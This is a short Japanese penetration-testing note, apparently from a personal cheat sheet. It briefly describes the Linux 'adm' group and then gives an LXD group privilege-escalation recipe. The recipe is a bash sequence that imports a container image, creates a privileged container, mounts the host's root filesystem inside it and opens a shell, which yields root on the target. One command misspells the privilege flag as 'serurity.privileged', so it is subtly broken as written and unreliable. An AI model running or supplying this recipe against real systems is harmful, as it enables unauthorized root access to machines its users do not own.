# adm
システムのログファイル（`/var/log`）の読み取り権限。
# lxd
次世代のシステムコンテナおよび仮想マシンマネージャ。  
lxdグループに所属するユーザーのシェルを取得している場合、攻撃者はコンテナイメージをターゲットに送り込み、ターゲットシステムのroot権限を奪取する。
## 権限昇格
下記でコンテナイメージをダウンロードできる。  
https://images.lxd.canonical.com/
```bash
# ターゲットでの操作
ls
lxd.tar.xz rootfs.squashfs
which lxc
/usr/bin/lxc
lxc image import lxd.tar.xz rootfs.squashfs --alias container # コンテナイメージをLXDにインポートし、containerというエイリアスで登録
lxc image list # 登録したイメージを確認
lxc init container privesc -c serurity.privileged=true # 登録したイメージをもとに、privescという特権コンテナを作成。
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true # 作成した特権コンテナの設定を変更。ターゲットのルートを/mnt/rootにマウント。
lxc start privesc # 起動
lxc exec privesc /bin/sh # 起動したコンテナで/bin/shを実行
```
